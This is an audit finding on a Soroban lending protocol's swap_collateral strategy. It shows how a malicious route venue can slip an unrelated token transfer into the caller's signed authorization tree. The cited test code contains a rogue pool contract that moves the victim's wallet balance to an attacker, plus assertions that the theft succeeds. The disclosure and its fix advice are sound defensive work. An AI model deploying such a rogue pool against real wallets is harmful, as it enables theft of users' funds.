### Title
Route-selected contracts can inject arbitrary token transfers into the caller's authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Medium. User-controlled `swap` bytes passed to strategy entrypoints can route execution through a malicious venue contract, which can invoke an unrelated `token.transfer(caller, attacker, amount)` beneath the caller's authorized strategy call. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_collateral` authenticates `caller`, verifies account ownership, and forwards the caller-controlled `swap` argument into the router boundary without inspecting its destination contracts. [3](#0-2)  The controller authorizes only its own exact input transfer to the configured router and then calls `execute_strategy`; this bounds the controller's input grant but does not constrain calls made by route-selected code below the router. [4](#0-3) [5](#0-4) 

A malicious pool named by the route can call a token unrelated to the lending position and request `transfer(alice, attacker, amount)`. [2](#0-1)  Simulation records that transfer as a child of Alice's `swap_collateral` authorization, and signing the simulated tree makes the theft execute while the swap still returns a valid output. [6](#0-5) 

### Impact Explanation
An attacker can steal arbitrary wallet tokens held by a strategy caller, including assets not deposited into or listed by the lending protocol. [7](#0-6) [8](#0-7)  The measured router output and final solvency checks do not bound this loss because they observe only the routed input/output assets, not unrelated token transfers authorized by the same signed tree. [9](#0-8) 

### Likelihood Explanation
The attack requires a malicious route and a wallet or client that signs the poisoned authorization tree, so it needs user interaction but no privileged protocol access. [10](#0-9)  The regression test demonstrates that an honest empty child list rejects the rogue transfer, while the simulated poisoned tree authorizes it and drains the wallet. [11](#0-10) 

### Recommendation
Restrict router routes to governance-allowlisted venue contracts or a fixed set of verified venue adapters rather than arbitrary addresses named by opaque route bytes. Until that invariant is enforced on-chain, the SDK and wallet integration must simulate controller strategy calls and reject any authorization tree containing children beneath the strategy entrypoint. [4](#0-3) [12](#0-11) 

### Proof of Concept
1. Alice supplies USDC and calls `swap_collateral(alice, account_id, USDC, amount, ETH, malicious_route)`. [13](#0-12) 
2. The route names an attacker-deployed pool whose `swap` function calls `wallet_token.transfer(alice, attacker, WALLET_BALANCE)`. [2](#0-1) 
3. Simulation returns a `swap_collateral` authorization containing the malicious wallet-token transfer as a child. [14](#0-13) 
4. Signing that tree completes the strategy, pays the expected output, and moves Alice's unrelated wallet balance to the attacker. [15](#0-14)

### Citations

**File:** contracts/controller/src/lib.rs (L283-291)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L20-23)
```rust
const SWAP_IN_USDC: i128 = 50_000_000_000; // 5 000 USDC, 7 decimals
const FAIR_OUT_ETH: i128 = 25_000_000; // 2.5 ETH at $2 000
const WALLET_BALANCE: i128 = 77_770_000_000; // Alice's balance of a token the protocol never listed

```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L147-157)
```rust
    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L166-182)
```rust
    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
        self.try_swap(route)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L206-225)
```rust
    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-268)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** common/src/token.rs (L43-51)
```rust
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```
